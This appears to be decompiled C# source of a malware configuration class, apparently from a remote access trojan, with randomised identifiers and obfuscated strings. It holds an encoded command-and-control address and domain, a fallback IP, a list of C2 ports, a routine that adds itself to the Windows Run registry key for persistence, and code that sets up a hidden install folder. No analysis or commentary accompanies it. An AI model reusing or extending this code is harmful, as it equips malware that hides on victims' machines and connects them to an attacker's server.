using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace rgocrwse;

internal static class ortmirdsCONF
{
	public static int ortmirdsport;

	public static string ortmirdspc_id = "majis|ortmirds".Split(new char[1] { '|' })[0];

	public static string ortmirdsremvUser = "lkurmnd|ortmirds".Split(new char[1] { '|' })[0];

	public static string ortmirdsfilesLogs = "wmbrd".Split(new char[1] { '|' })[0];

	public static string ortmirdsAppPath = "";

	public static byte[] ortmirdsvpsips = new byte[31]
	{
		49, 48, 52, 46, 49, 52, 52, 46, 49, 57,
		56, 46, 49, 50, 49, 63, 117, 105, 119, 97,
		113, 115, 116, 111, 114, 101, 115, 46, 110, 101,
		116
	};

	public static string ortmirdsappPath = "\\Rodams\\|ortmirds".Split(new char[1] { '|' })[0];

	public static string ortmirdsdefaultP = "222.103.221.103|ortmirds".Split(new char[1] { '|' })[0];

	public static string ortmirdsmainApp = "rgocrwse|ortmirds".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 2864, 6892, 8462, 12614, 16812 };

	public static string ortmirdsOsname()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion!ortmirds".Split(new char[1] { '!' })[0]);
			if (registryKey != null)
			{
				string text = registryKey.GetValue("ProductName!ortmirds".Split(new char[1] { '!' })[0])!.ToString()!.Trim();
				if (text != null)
				{
					return text;
				}
			}
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!ortmirds".Split(new char[1] { '!' })[0];
		}
	}

	public static void ortmirdsset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|ortmirds".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = ortmirdspc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static string ortmirdsget_mpath()
	{
		if (ortmirdsAppPath != "")
		{
			return ortmirdsAppPath;
		}
		ortmirdsAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + ortmirdsappPath;
		try
		{
			if (!Directory.Exists(ortmirdsAppPath))
			{
				Directory.CreateDirectory(ortmirdsAppPath);
			}
			if (Directory.Exists(ortmirdsAppPath))
			{
				return ortmirdsAppPath;
			}
		}
		catch
		{
		}
		ortmirdsAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + ortmirdsappPath;
		try
		{
			if (!Directory.Exists(ortmirdsAppPath))
			{
				Directory.CreateDirectory(ortmirdsAppPath);
			}
			if (!Directory.Exists(ortmirdsAppPath))
			{
				return ortmirdsAppPath;
			}
		}
		catch
		{
		}
		ortmirdsAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + ortmirdsappPath;
		try
		{
			if (!Directory.Exists(ortmirdsAppPath))
			{
				Directory.CreateDirectory(ortmirdsAppPath);
			}
			if (!Directory.Exists(ortmirdsAppPath))
			{
				return ortmirdsAppPath;
			}
		}
		catch
		{
		}
		ortmirdsAppPath = Application.get_ExecutablePath();
		return ortmirdsAppPath;
	}
}
